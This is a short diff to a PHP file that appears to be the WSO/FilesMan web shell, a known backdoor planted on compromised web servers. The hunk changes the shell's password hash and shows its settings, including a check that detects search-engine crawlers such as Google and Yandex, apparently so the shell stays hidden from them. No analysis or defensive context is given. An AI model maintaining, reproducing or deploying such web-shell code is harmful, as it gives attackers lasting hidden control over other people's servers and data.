@@ -3,7 +3,7 @@ $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'Windows-1251';
-$auth_pass = "5f55836fb25ae0c6f790aed6195520f2";
+$auth_pass = "9abfae448bc00ea3214033a3086e6539";
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
